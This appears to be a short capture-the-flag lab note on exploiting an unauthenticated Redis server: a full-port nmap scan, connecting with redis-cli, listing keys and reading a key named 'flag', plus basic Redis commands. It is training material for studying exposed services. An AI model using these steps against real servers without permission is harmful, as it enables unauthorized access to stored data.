## How is redis working

Redis = an in-memory dictionary service that stores everything in RAM and listens on port 6379.

Components:

Server → runs on port 6379 by default.

redis-cli  → connects via TCP to send commands.

Data structure store → all data is kept as keys and values (strings, lists, sets, etc).

## Key steps

1. Port / service discovery
```bash
# full TCP scan (all ports)
sudo nmap -p- -sS -T4 --min-rate 1000  ip
```
2. Connect to redis DB
```bash
redis-cli -h IP
```
3. List keys
```bash
KEYS *
```
4. Download the flag
```bash
GET flag
```



## Useful commands

```bash
# connect interactively (no auth)
redis-cli -h <IP> -p <PORT>

# connect with password
redis-cli -h <IP> -p 6379 -a 'password'
```
Inside redis cli

```bash
PING            # check server responsiveness -> PONG
INFO            # server info (memory, clients, persistence)
INFO keyspace   # shows which logical DBs contain keys
DBSIZE          # number of keys in the currently selected DB
CONFIG GET databases   # how many logical DBs are configured
SELECT <n>      # switch to logical DB n (0..)

```
